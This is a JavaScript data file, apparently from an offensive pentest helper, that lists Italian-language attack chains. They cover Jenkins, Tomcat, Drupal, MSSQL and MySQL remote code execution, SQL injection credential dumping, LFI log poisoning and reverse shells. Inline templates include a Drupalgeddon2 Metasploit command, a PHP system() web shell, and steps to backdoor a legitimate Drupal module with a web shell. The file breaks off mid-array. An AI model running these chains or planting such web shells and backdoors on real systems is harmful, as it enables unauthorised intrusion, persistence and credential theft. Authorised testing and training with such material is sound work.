/* chains.js — generato da WannaHack il 2026-10-27T12:04:36.682Z */
const CHAINS = [
  {
    "id": "passive-subs",
    "name": "Passive Subdomain Discovery",
    "short": "subs",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "tactic": "Reconnaissance",
    "difficulty": "easy",
    "estTime": "10 min",
    "objective": "Enumerare il maggior numero di sottodomini senza inviare traffico al target: si aggregano più fonti passive, si uniscono le liste e si risolvono per tenere solo gli host attivi.",
    "outcome": "Una lista di sottodomini attivi, con host e indirizzo IP, pronta per la fase di ricognizione attiva.",
    "prereqs": [
      "Serve solo il dominio principale",
      "Le chiavi API di subfinder e chaos migliorano la copertura (facoltative)"
    ],
    "mitre": [
      "T1590.002",
      "T1596.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Sottodomini dai log di Certificate Transparency",
        "cmdRef": "crtsh",
        "verify": "Il file crtsh.txt non è vuoto e contiene i sottodomini estratti dai certificati pubblici."
      },
      {
        "id": "s2",
        "title": "subfinder",
        "cmdRef": "subfinder",
        "verify": "`subfinder.txt` contiene i sottodomini trovati, uno per riga."
      },
      {
        "id": "s3",
        "title": "amass in modalita passiva",
        "cmdRef": "amass-passive",
        "verify": "`amass.txt` esiste e aggiunge nomi che le altre fonti non avevano restituito."
      },
      {
        "id": "s4",
        "title": "assetfinder",
        "cmdRef": "assetfinder",
        "verify": "`assetfinder.txt` e popolato."
      },
      {
        "id": "s5",
        "title": "chaos",
        "cmdRef": "chaos",
        "verify": "`chaos.txt` e popolato. Un file vuoto con errore di autenticazione indica una chiave API mancante o scaduta."
      },
      {
        "id": "s6",
        "title": "theHarvester",
        "cmdRef": "theharvester",
        "verify": "Vengono creati i file con gli host e le email raccolti dalle fonti pubbliche.",
        "variant": "default"
      },
      {
        "id": "s7",
        "title": "Unisci le liste e risolvi",
        "cmdRef": "dnsx-resolve",
        "verify": "`resolved.txt` elenca solo gli host che rispondono, con il loro indirizzo: ha meno righe della lista unita di partenza."
      }
    ]
  },
  {
    "id": "passive-footprint",
    "name": "Passive Domain Footprint",
    "short": "recon",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "tactic": "Reconnaissance",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Costruire una mappa esterna completa del dominio senza inviargli traffico: dati di registrazione, DNS, sottodomini, email e servizi esposti, tutto da fonti di terze parti.",
    "outcome": "Sottodomini e host attivi, schema dei nomi utente dedotto dalle email e porte esposte, raccolti senza toccare il target.",
    "prereqs": [
      "Serve solo il dominio principale",
      "Le chiavi API (Shodan e fonti di subfinder) migliorano la copertura (facoltative)"
    ],
    "mitre": [
      "T1590",
      "T1591",
      "T1596",
      "T1589.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Registrazione e name server",
        "cmdRef": "whois-domain",
        "verify": "whois restituisce il registrar, le date e i name server del dominio."
      },
      {
        "id": "s2",
        "title": "Record DNS",
        "cmdRef": "dig-records",
        "verify": "Per ogni tipo interrogato compare la risposta. I record MX e TXT rivelano il provider di posta e i servizi cloud in uso."
      },
      {
        "id": "s3",
        "title": "Sottodomini dai log di Certificate Transparency",
        "cmdRef": "crtsh",
        "verify": "crtsh.txt non è vuoto."
      },
      {
        "id": "s4",
        "title": "Aggrega altri sottodomini",
        "cmdRef": "subfinder",
        "verify": "`subfinder.txt` aggiunge nomi non presenti tra quelli estratti dai certificati."
      },
      {
        "id": "s5",
        "title": "Risolvi agli host attivi",
        "cmdRef": "dnsx-resolve",
        "verify": "`resolved.txt` contiene le coppie host e indirizzo IP dei soli host attivi."
      },
      {
        "id": "s6",
        "title": "Email e schema dei nomi",
        "cmdRef": "theharvester",
        "verify": "L'output elenca indirizzi email da cui si deduce lo schema dei nomi, per esempio nome.cognome."
      },
      {
        "id": "s7",
        "title": "Servizi esposti (fonte passiva)",
        "cmdRef": "shodan-host",
        "verify": "Shodan restituisce porte, banner e certificati noti per l'indirizzo, senza inviargli pacchetti."
      }
    ]
  },
  {
    "id": "jenkins-rce",
    "name": "Jenkins Script Console, RCE",
    "short": "jenkins",
    "category": "service-enum",
    "subcategory": "web-apps",
    "tactic": "Exploitation",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Un'istanza Jenkins esposta porta all'esecuzione di comandi sul server tramite la Script Console, che interpreta codice Groovy con i privilegi del processo. Per raggiungerla basta una delle vie d'accesso tipiche: credenziali di default, istanza senza autenticazione o un account amministrativo. Un primo comando Groovy conferma la RCE, poi una reverse shell rende stabile il foothold, spesso già come SYSTEM su Windows o root su Linux.",
    "outcome": "Esecuzione di comandi come utente del processo Jenkins, spesso SYSTEM o root.",
    "prereqs": [
      "Un'istanza Jenkins raggiungibile, in genere sulla porta 8080",
      "Un modo per entrare nella dashboard: credenziali di default, un account amministrativo o un'istanza senza autenticazione",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Fingerprint di Jenkins",
        "cmdRef": "whatweb",
        "verify": "L'header `X-Jenkins` nella risposta, o la pagina `/configureSecurity/`, identifica Jenkins e ne rivela la versione."
      },
      {
        "id": "s2",
        "title": "Accesso alla dashboard",
        "cmdRef": "web-default-creds",
        "verify": "La dashboard risponde 200 con `admin:admin`, oppure si apre senza login. L'assenza di un redirect verso `/login` segnala l'accesso anonimo."
      },
      {
        "id": "s3",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener attende connessioni sulla porta indicata in LPORT."
      },
      {
        "id": "s4",
        "title": "Conferma RCE via Groovy",
        "cmdRef": "jenkins-script",
        "variant": "default",
        "verify": "Un `id` o `whoami` dalla Script Console stampa l'output nella pagina: la RCE è confermata, spesso come `nt authority\\system` su Windows o `root` su Linux."
      },
      {
        "id": "s5",
        "title": "Reverse shell via Groovy",
        "cmdRef": "jenkins-script",
        "variant": "linux",
        "verify": "Con il listener già attivo, la reverse shell Groovy fa arrivare la connessione. La variante qui è Linux; su host Windows usa la variante Windows del comando dalla libreria."
      },
      {
        "id": "s6",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "Dopo l'upgrade la sessione regge Ctrl+C e gli editor interattivi; `whoami` conferma l'utente del processo Jenkins."
      }
    ]
  },
  {
    "id": "tomcat-rce",
    "name": "Tomcat Manager, WAR, RCE",
    "short": "tomcat",
    "category": "service-enum",
    "subcategory": "web-apps",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Un Tomcat esposto porta all'esecuzione di comandi tramite il Manager: con credenziali deboli o di default si carica un'applicazione `.war` che contiene una web shell JSP, e Tomcat la esegue con i privilegi del proprio processo. È un foothold classico verso la rete interna, perché Tomcat gira spesso su host applicativi.",
    "outcome": "Shell come utente del servizio Tomcat.",
    "prereqs": [
      "Un'istanza Tomcat raggiungibile, in genere sulla porta 8080 o 8180",
      "L'accesso al Manager, che richiede credenziali valide",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190",
      "T1505.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Fingerprint di versione",
        "cmdRef": "whatweb",
        "verify": "L'header HTTP `Server` o la pagina `/docs` rivelano la versione, per esempio `Apache Tomcat 9.0.30`. Una versione con CVE nota può rendere superfluo il resto della catena."
      },
      {
        "id": "s2",
        "title": "Trova il Manager",
        "cmdRef": "ffuf-dir",
        "variant": "default",
        "verify": "Compaiono `/manager` e `/host-manager`, di solito con un redirect 302 verso la pagina di login."
      },
      {
        "id": "s3",
        "title": "Prova le credenziali di default",
        "cmdRef": "web-default-creds",
        "verify": "Un 200 sul Manager con coppie come `tomcat:tomcat` o `admin:admin` dà l'accesso senza bruteforce."
      },
      {
        "id": "s4",
        "title": "Bruteforce del Manager, se i default falliscono",
        "cmdRef": "tomcat-manager",
        "variant": "msf",
        "verify": "Lo scanner riporta una coppia valida, per esempio `tomcat:admin`. `STOP_ON_SUCCESS` lo ferma al primo esito utile."
      },
      {
        "id": "s5",
        "title": "Genera il payload WAR",
        "cmdRef": "msfvenom",
        "variant": "war",
        "verify": "Viene creato `shell.war`. Il payload `java/jsp_shell_reverse_tcp` è quello giusto per il container Java."
      },
      {
        "id": "s6",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener attende connessioni sulla porta indicata in LPORT."
      },
      {
        "id": "s7",
        "title": "Deploy del WAR ed esecuzione",
        "cmdRef": "tomcat-manager",
        "variant": "deploy",
        "verify": "Il Manager risponde `OK - Deployed application`. La richiesta all'applicazione appena distribuita (`/shell/`) esegue la JSP e fa arrivare la connessione sul listener."
      },
      {
        "id": "s8",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor interattivi; `id` mostra l'utente del servizio Tomcat."
      }
    ]
  },
  {
    "id": "drupal-drupalgeddon2",
    "name": "Drupal Drupalgeddon2, RCE pre-auth",
    "short": "drupalgeddon",
    "category": "service-enum",
    "subcategory": "web-apps",
    "tactic": "Exploitation",
    "difficulty": "easy",
    "estTime": "10 min",
    "objective": "Sui core Drupal datati, Drupalgeddon2 (CVE-2018-7600) dà esecuzione di comandi senza alcuna credenziale: una sanitizzazione insufficiente in fase di registrazione utente consente l'iniezione di comandi. Dopo aver confermato piattaforma e versione, il modulo Metasploit apre direttamente una shell. È la via rapida, point-and-shoot, quando la versione è vulnerabile.",
    "outcome": "Shell (sessione Meterpreter) come utente del web server, tipicamente www-data.",
    "prereqs": [
      "Un'istanza Drupal raggiungibile via HTTP",
      "Un core vulnerabile: < 7.58 oppure < 8.5.1",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Footprint di Drupal",
        "cmdRef": "whatweb",
        "verify": "Il meta tag `Generator` con `Drupal`, la stringa `Powered by Drupal` o le URI nella forma `/node/1` confermano la piattaforma."
      },
      {
        "id": "s2",
        "title": "Versione: il core è vulnerabile?",
        "cmdRef": "droopescan",
        "cmd": {
          "name": "droopescan — Drupal/Joomla",
          "description": "Scanner per Drupal: versione, plugin e tema. Identifica la versione per cercare l’exploit giusto (es. Drupalgeddon).",
          "template": "droopescan scan drupal -u http://<ip>",
          "params": [
            {
              "key": "ip",
              "label": "Target",
              "ctx": "ip",
              "placeholder": "10.10.10.11"
            }
          ]
        },
        "variant": "default",
        "verify": "droopescan riporta le versioni probabili. Un core < 7.58 o < 8.5.1 è vulnerabile a Drupalgeddon2; con una versione più recente questa via non funziona e serve la catena autenticata via PHP filter."
      },
      {
        "id": "s3",
        "title": "RCE pre-auth con Drupalgeddon2",
        "cmdRef": "drupal-rce",
        "cmd": {
          "name": "Drupal — RCE (PHP filter / Drupalgeddon)",
          "description": "RCE pre-auth su Drupal < 7.58 e < 8.5.1, dovuta ad una sanitizzazione insufficiente in fase di registrazione utente. Nessuna credenziale richiesta: il modulo Metasploit consegna direttamente una sessione con i privilegi del web server.",
          "template": "msfconsole -q -x \"use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <ip>; set LHOST <lhost>; run; exit\"",
          "params": [
            {
              "key": "ip",
              "label": "Ip",
              "placeholder": ""
            },
            {
              "key": "lhost",
              "label": "Lhost",
              "placeholder": ""
            }
          ]
        },
        "variant": "drupalgeddon2",
        "verify": "Il modulo Metasploit apre una sessione Meterpreter e `getuid` riporta www-data: la catena è conclusa."
      }
    ]
  },
  {
    "id": "drupal-rce",
    "name": "Drupal PHP filter, RCE autenticata",
    "short": "drupal",
    "category": "service-enum",
    "subcategory": "web-apps",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Con un accesso amministrativo al pannello Drupal, il modulo PHP filter permette di pubblicare una pagina che esegue codice PHP arbitrario. Su Drupal < 8 il modulo è nel core; dalla 8 in poi va installato a mano. La web shell così ottenuta viene poi trasformata in una reverse shell stabile. È la via da seguire quando il core non è vulnerabile a Drupalgeddon.",
    "outcome": "Shell come utente del web server, tipicamente www-data.",
    "prereqs": [
      "Un'istanza Drupal raggiungibile via HTTP",
      "Un accesso amministrativo al pannello",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190",
      "T1505.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Footprint di Drupal",
        "cmdRef": "whatweb",
        "verify": "Il meta tag `Generator` con `Drupal`, la stringa `Powered by Drupal` o le URI nella forma `/node/1` confermano la piattaforma."
      },
      {
        "id": "s2",
        "title": "Versione e moduli",
        "cmdRef": "droopescan",
        "variant": "default",
        "verify": "droopescan riporta le versioni probabili (per esempio `8.9.1`) e i moduli installati, come `.../modules/php/`. La versione dice se PHP filter è già nel core (Drupal < 8) o va installato (dalla 8 in poi)."
      },
      {
        "id": "s3",
        "title": "Accesso come amministratore",
        "cmdRef": "web-default-creds",
        "verify": "Il pannello `/user/login` accetta le credenziali e `/admin` diventa raggiungibile."
      },
      {
        "id": "s4",
        "title": "Web shell tramite PHP filter",
        "cmdRef": "drupal-rce",
        "cmd": {
          "name": "Drupal — RCE (PHP filter / Drupalgeddon)",
          "description": "Ottenere una shell su Drupal non è immediato come su altri CMS. Le tre vie principali:\n1. PHP filter: con accesso admin, il modulo permette di pubblicare una pagina che esegue codice PHP.\n2. Modulo con web shell: si carica un modulo legittimo modificato per includervi una web shell.\n\nIl codice gira come utente del web server, di norma www-data.",
          "template": "# Drupal <8: attivazione del modulo core \"PHP filter\"\n# Drupal >=8: installazione prima del modulo php-8.x-1.1.tar.gz da drupal.org\n# Content > Add content > Basic page, Text format \"PHP code\", corpo della pagina:\n<?php system($_GET['<hash>']); ?>\n# la pagina viene salvata su /node/<node>, esecuzione comandi:\ncurl -s \"http://<ip>/node/<node>?<hash>=id\"",
          "params": [
            {
              "key": "hash",
              "label": "Nome parametro",
              "placeholder": "dcfdd5e021a869fcc6dfaef8bf31377e",
              "ctx": "hash"
            },
            {
              "key": "node",
              "label": "Node ID",
              "placeholder": "3"
            },
            {
              "key": "ip",
              "label": "Target",
              "ctx": "ip",
              "placeholder": "drupal.inlanefreight.local"
            }
          ],
          "variants": [
            {
              "id": "default",
              "label": "PHP filter (web shell)",
              "template": "# Drupal <8: attivazione del modulo core \"PHP filter\"\n# Drupal >=8: installazione prima del modulo php-8.x-1.1.tar.gz da drupal.org\n# Content > Add content > Basic page, Text format \"PHP code\", corpo della pagina:\n<?php system($_GET['<hash>']); ?>\n# la pagina viene salvata su /node/<node>, esecuzione comandi:\ncurl -s \"http://<ip>/node/<node>?<hash>=id\"",
              "description": "Modulo PHP filter come vettore. Prima della 8 è nel core e basta abilitarlo, dalla 8 va installato a parte. Una Basic page con Text format `PHP code` esegue lo snippet, e il parametro GET rinominato con un hash evita una web shell dal nome ovvio. Modifica invasiva: richiede consenso e cleanup di modulo e pagina."
            },
            {
              "id": "backdoor",
              "label": "modulo backdoor",
              "template": "# scarica un modulo legittimo da drupal.org\nwget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz\n\n# lo scompatta\ntar xf captcha-8.x-1.2.tar.gz\n\n# aggiunge la webshell PHP dentro il modulo\nprintf '<?php system($_GET[\"<hash>\"]); ?>' > captcha/shell.php\n\n# aggiunge un .htaccess che sblocca l'accesso diretto a /modules\nprintf '<IfModule mod_rewrite.c>\\nRewriteEngine On\\nRewriteBase /\\n</IfModule>' > captcha/.htaccess\n\n# ricompatta il modulo, ora con la backdoor dentro\ntar czf captcha.tar.gz captcha/\n\n# dopo l'upload da Manage > Extend > Install new module, esegue i comandi\ncurl -s \"http://<ip>/modules/captcha/shell.php?<hash>=id\"",
              "description": "Modulo legittimo trasformato in backdoor. Nell'archivio del modulo Captcha vengono aggiunti una web shell PHP e un `.htaccess` che sblocca l'accesso diretto a `/modules`; dopo l'installazione dal pannello la shell risponde su `/modules/captcha/shell.php`. Anche qui servono consenso e rimozione degli artefatti."
            }
          ]
        },
        "variant": "default",
        "verify": "Una Basic page salvata con Text format `PHP code` esegue codice: `curl \".../node/<node>?<hash>=id\"` restituisce `uid=33(www-data)`."
      },
      {
        "id": "s5",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener attende connessioni sulla porta indicata in LPORT."
      },
      {
        "id": "s6",
        "title": "Reverse shell dalla web shell",
        "cmdRef": "revshell",
        "variant": "default",
        "verify": "Il one-liner bash, url-encoded nel parametro della web shell, fa arrivare la connessione sul listener."
      },
      {
        "id": "s7",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor; `id` conferma www-data."
      }
    ]
  },
  {
    "id": "mssql-rce",
    "name": "MSSQL, RCE",
    "short": "mssql",
    "category": "service-enum",
    "subcategory": "mssql",
    "tactic": "Exploitation",
    "difficulty": "easy",
    "estTime": "10 min",
    "objective": "Credenziali MSSQL valide portano all'esecuzione di comandi sul server. Dopo il login si verifica il ruolo dell'utente: con il ruolo sysadmin, `xp_cmdshell` dà esecuzione di comandi diretta; senza, si cerca un login da impersonare, come `sa`, per ottenere comunque quel privilegio.",
    "outcome": "Esecuzione di comandi come account di servizio di SQL Server.",
    "prereqs": [
      "Credenziali MSSQL valide, di tipo SQL o di dominio"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Il prompt passa a `SQL>`. Un login rifiutato indica credenziali errate o che il server richiede l'autenticazione Windows.",
        "title": "Connessione",
        "cmdRef": "mssql-login"
      },
      {
        "id": "s2",
        "title": "Verifica del ruolo",
        "cmdRef": "mssql-roles",
        "cmd": {
          "name": "MSSQL — ruoli & privilegi",
          "description": "Dentro la sessione MSSQL serve a capire quali azioni sono possibili prima di attaccare. \nL'ultima query elenca i login impersonabili.",
          "template": "SELECT IS_SRVROLEMEMBER('sysadmin');",
          "params": [],
          "variants": [
            {
              "id": "sysadmin",
              "label": "Sei sysadmin?",
              "template": "SELECT IS_SRVROLEMEMBER('sysadmin');",
              "description": "`1` indica ruolo sysadmin attivo e quindi xp_cmdshell diretto\n`0` il contrario\n`NULL` un nome di ruolo scritto male."
            },
            {
              "id": "whoami",
              "label": "Identità corrente",
              "template": "SELECT SYSTEM_USER AS login, USER_NAME() AS db_user, IS_SRVROLEMEMBER('sysadmin') AS is_sa;",
              "description": "Login corrente, utente nel database e presenza del ruolo sysadmin, in una sola riga."
            },
            {
              "id": "impersonate",
              "label": "Chi posso impersonare",
              "template": "SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
              "description": "Login su cui è concesso il permesso `IMPERSONATE`. La comparsa di `sa` o di un sysadmin apre la scalata con `EXECUTE AS LOGIN`."
            }
          ]
        },
        "verify": "`IS_SRVROLEMEMBER('sysadmin')` torna `1` con il ruolo sysadmin (si prosegue con xp_cmdshell) oppure `0` (si passa all'impersonation)."
      },
      {
        "id": "s3",
        "verify": "`sp_configure` riattiva la procedura e il comando restituisce l'output nella griglia dei risultati. Il messaggio `SQL Server blocked access to procedure` indica che l'utente non è sysadmin: in quel caso si usa il ramo dell'impersonation.",
        "title": "Con sysadmin: `xp_cmdshell`",
        "cmdRef": "mssql-xpcmdshell",
        "overrides": {
          "cmd": "whoami"
        }
      },
      {
        "id": "s4",
        "verify": "`EXECUTE AS LOGIN = 'sa'` assume l'identità di sa e `SELECT SYSTEM_USER` lo conferma. Nello stesso batch `xp_cmdshell` viene eseguito come sa, quindi la RCE avviene qui; `REVERT` riporta al login iniziale.",
        "title": "Senza sysadmin: impersona sa",
        "cmdRef": "mssql-impersonate"
      }
    ]
  },
  {
    "id": "mysql-rce",
    "name": "MySQL, RCE",
    "short": "mysql",
    "category": "service-enum",
    "subcategory": "mysql",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Credenziali MySQL portano all'esecuzione di comandi, ma senza un `xp_cmdshell` pronto come in MSSQL. Si verificano prima il privilegio `FILE` e l'impostazione `secure_file_priv`; se lo consentono, `INTO OUTFILE` scrive una web shell PHP nel webroot. La web shell viene poi richiamata via HTTP e trasformata in una reverse shell. Gira come utente del web server, non del database.",
    "outcome": "Shell come utente del web server, tipicamente www-data: la web shell PHP è servita dal web server, non da mysqld.",
    "prereqs": [
      "Credenziali MySQL valide",
      "Il privilegio FILE e un secure_file_priv permissivo",
      "Un webroot scrivibile e raggiungibile via HTTP sullo stesso host",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Connessione",
        "cmdRef": "mysql-login",
        "verify": "Il prompt passa a `mysql>`."
      },
      {
        "id": "s2",
        "title": "Verifica dei prerequisiti",
        "cmdRef": "mysql-privcheck",
        "cmd": {
          "name": "MySQL — check RCE",
          "description": "Prima di tentare la RCE serve verificarne la fattibilità: MySQL non ha un `xp_cmdshell` pronto, quindi occorrono il privilegio `FILE` e un `secure_file_priv` non bloccato.\n- `secure_file_priv` = `''` (vuoto) consente la scrittura ovunque · `/path` la limita a quella directory · `NULL` la disabilita, e la RCE via file cade\n- il privilegio `FILE` deve comparire nei grant\n- `plugin_dir` indica dove va collocata la libreria per la via UDF",
          "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
          "params": [],
          "variants": [
            {
              "id": "default",
              "label": "secure_file_priv + plugin_dir",
              "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
              "description": "Un `secure_file_priv` vuoto consente la scrittura di file ovunque, quindi OUTFILE e UDF sono percorribili; con `NULL` la RCE via file è impossibile. `plugin_dir` indica dove caricare la `.so` per l'UDF."
            },
            {
              "id": "grants",
              "label": "Ho FILE privilege?",
              "template": "SHOW GRANTS FOR CURRENT_USER();",
              "description": "Il privilegio da cercare è `FILE`, o in alternativa `ALL PRIVILEGES`. Senza `FILE` non sono possibili OUTFILE, LOAD_FILE né UDF via outfile."
            },
            {
              "id": "whoami",
              "label": "Utente corrente",
              "template": "SELECT current_user(), user();",
              "description": "Login autenticato vs quello richiesto: utile per capire il contesto."
            }
          ]
        },
        "verify": "Servono il privilegio `FILE` e un `secure_file_priv` permissivo. Se `secure_file_priv` è vuoto la scrittura è libera; se contiene un percorso la limita a quella cartella; se è `NULL` la via OUTFILE è bloccata."
      },
      {
        "id": "s3",
        "title": "Web shell via OUTFILE",
        "cmdRef": "mysql-oscmd",
        "variant": "outfile",
        "verify": "`Query OK` e il file `.php` compare nel webroot indicato. Richiede il privilegio `FILE` e una cartella del web server scrivibile dall'utente del database."
      },
      {
        "id": "s4",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener attende connessioni sulla porta indicata in LPORT."
      },
      {
        "id": "s5",
        "title": "Reverse shell dalla web shell",
        "cmdRef": "revshell",
        "variant": "default",
        "verify": "Il one-liner bash, url-encoded nel parametro `cmd` della web shell (`curl \"http://<ip>/sh.php?cmd=...\"`), fa arrivare la connessione sul listener."
      },
      {
        "id": "s6",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor interattivi; `id` mostra l'utente del web server, tipicamente www-data."
      }
    ]
  },
  {
    "id": "sqli-to-creds",
    "name": "SQLi, Dump, Login",
    "short": "sqli",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "tactic": "Credential Access",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Da un’iniezione SQL estrai le credenziali applicative, crackale se hashate e riusale per autenticarti.",
    "outcome": "Credenziali valide dall’applicazione",
    "prereqs": [
      "Parametro iniettabile (SQLi)"
    ],
    "mitre": [
      "T1190",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "La pagina risponde in modo diverso rispetto al valore legittimo, per esempio restituendo tutte le righe oppure un errore SQL.",
        "title": "Conferma l’iniezione",
        "cmdRef": "sqli-detect"
      },
      {
        "id": "s2",
        "verify": "sqlmap elenca i database sotto `available databases`. Se dichiara il parametro non iniettabile vanno alzati `--level` e `--risk`.",
        "title": "Enumera i database",
        "cmdRef": "sqlmap",
        "variant": "default"
      },
      {
        "id": "s3",
        "verify": "Il contenuto della tabella viene salvato sotto `~/.local/share/sqlmap/output/<host>/dump/`.",
        "title": "Dumpa la tabella utenti",
        "cmdRef": "sqlmap",
        "variant": "dump"
      },
      {
        "id": "s4",
        "verify": "`Status...: Cracked`. Il mode va scelto in base al formato osservato, per esempio 0 per MD5 e 1400 per SHA-256.",
        "title": "Cracka se hashate, poi riusa",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "0"
        }
      }
    ]
  },
  {
    "id": "lfi-to-rce",
    "name": "LFI, Log Poisoning, RCE",
    "short": "lfi",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Trasforma una Local File Inclusion in esecuzione di codice avvelenando un log con PHP e poi includendolo.",
    "outcome": "RCE come utente del web server",
    "prereqs": [
      "Parametro vulnerabile a LFI",
      "Accesso in lettura a un log (Apache/Nginx/auth)"
    ],
    "mitre": [
      "T1190",
      "T1505.003"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "La risposta contiene il contenuto di `/etc/passwd`, quindi l'inclusione arbitraria di file è confermata.",
        "title": "Conferma la LFI",
        "cmdRef": "lfi"
      },
      {
        "id": "s2",
        "verify": "La richiesta viene registrata nel log di access con lo User-Agent malevolo. Il percorso varia fra `/var/log/apache2/access.log` e `/var/log/nginx/access.log` e deve essere leggibile.",
        "title": "Inietta PHP nel log (User-Agent)",
        "cmdRef": "lfi-logpoison",
        "variant": "default"
      },
      {
        "id": "s3",
        "verify": "Includendo il log e passando il parametro `cmd`, l'output del comando compare nella pagina e conferma l'esecuzione.",
        "title": "Includi il log ed esegui",
        "cmdRef": "lfi-logpoison",
        "variant": "trigger"
      }
    ]
  },
  {
    "id": "payload-to-shell",
    "name": "Payload, Listener, Shell stabile",
    "short": "payload",
    "category": "exploitation",
    "subcategory": "payloads",
    "tactic": "Execution",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Trasformare una esecuzione di comandi qualsiasi in una shell interattiva utilizzabile. Il flusso è sempre lo stesso: si genera il payload nel formato adatto al target, si mette in ascolto un listener, si consegna ed esegue il payload e infine si stabilizza la shell, perché una shell non stabilizzata muore al primo Ctrl+C e non gestisce editor né sudo.",
    "outcome": "Shell interattiva e stabile sul target",
    "prereqs": [
      "Un modo per eseguire comandi sul target, anche limitato",
      "Connettività di rete dal target verso la macchina attaccante",
      "Il formato del payload deve corrispondere al sistema operativo e all'architettura"
    ],
    "mitre": [
      "T1059",
      "T1105"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Generazione del payload",
        "cmdRef": "msfvenom",
        "variant": "default",
        "verify": "Il file viene creato e `file shell.elf` ne conferma architettura e formato. La dimensione anomala di pochi byte indica un errore nella generazione."
      },
      {
        "id": "s2",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener resta in attesa senza restituire il prompt. `ss -lntp` conferma la porta in stato LISTEN."
      },
      {
        "id": "s3",
        "title": "Consegna del payload al target",
        "cmdRef": "transfer-http",
        "variant": "default",
        "verify": "Il log del server HTTP registra la richiesta GET con codice `200` proveniente dall'IP del target."
      },
      {
        "id": "s4",
        "title": "Alternativa senza file, one-liner",
        "cmdRef": "revshell",
        "variant": "default",
        "verify": "La connessione arriva sul listener senza che nulla sia stato scritto su disco, il che evita del tutto l'antivirus su filesystem."
      },
      {
        "id": "s5",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "Dopo l'upgrade funzionano Ctrl+C senza chiudere la sessione, la cronologia con le frecce, `clear` e gli editor a schermo intero."
      },
      {
        "id": "s6",
        "title": "Handler Metasploit per meterpreter",
        "cmdRef": "msf-handler",
        "verify": "`Meterpreter session 1 opened`. Da lì `getuid` e `sysinfo` confermano contesto utente e sistema operativo."
      }
    ]
  },
  {
    "id": "webshell-to-shell",
    "name": "Upload, Web Shell, Reverse Shell",
    "short": "webshell",
    "category": "exploitation",
    "subcategory": "webshells",
    "tactic": "Persistence",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Passare da un form di upload mal filtrato a una shell interattiva. La web shell serve da testa di ponte, perché vive dentro il processo del web server e ne eredita i privilegi, ma resta scomoda: il passo successivo è sempre convertirla in una reverse shell vera.",
    "outcome": "Reverse shell come utente del web server",
    "prereqs": [
      "Un punto di upload raggiungibile e una directory di destinazione servita dal web server",
      "Conoscenza del linguaggio lato server, per scegliere l'estensione giusta",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1505.003",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Bypass dei controlli di estensione",
        "cmdRef": "file-upload",
        "variant": "ext",
        "verify": "L'upload viene accettato e il file risulta raggiungibile via HTTP. Un `403` sulla directory di upload indica che l'esecuzione è disabilitata e serve un'altra destinazione."
      },
      {
        "id": "s2",
        "title": "Bypass basato sui magic bytes",
        "cmdRef": "file-upload",
        "variant": "magic",
        "verify": "Il file supera la validazione sul contenuto pur restando eseguibile lato server."
      },
      {
        "id": "s3",
        "title": "Web shell da caricare",
        "cmdRef": "kali-webshells",
        "variant": "default",
        "verify": "Richiamando la web shell con il parametro previsto, per esempio `?cmd=id`, la risposta contiene l'output del comando."
      },
      {
